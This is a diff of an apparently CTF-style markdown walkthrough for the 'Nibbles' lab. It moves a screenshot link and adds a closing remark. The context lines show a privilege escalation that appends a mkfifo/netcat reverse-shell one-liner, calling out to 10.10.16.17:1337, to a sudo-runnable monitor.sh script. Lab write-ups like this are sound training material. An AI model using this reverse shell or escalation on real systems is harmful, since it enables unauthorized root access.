@@ -42,10 +42,13 @@ You need to go into this directory and there you can find user.txt /home/nibbler
 By command: sudo -l you can know, what kind of script nibbler can run as root, here is the results:
 Now we know, this script name is monitor.sh
 
+![obraz](https://github.com/Anogota/Nibbles/assets/143951834/febbccc3-9e94-47af-9bae-80a290a71b01)
+
 8.Submit the flag located in root's home directory.
 It is easy to get you need to only write this command in your terminal: echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.17 1337 >/tmp/f' | tee -a monitor.sh
 Than you have access by root. Than write this sudo /home/nibbler/personal/stuff/monitor.sh and you got this, the root.
 
 ![obraz](https://github.com/Anogota/Nibbles/assets/143951834/0fd73d4a-7b80-4aff-80c7-286c931650c3)
 
-![obraz](https://github.com/Anogota/Nibbles/assets/143951834/febbccc3-9e94-47af-9bae-80a290a71b01)
+Now to to the /root and get your own, and you pwned the lab :)
+
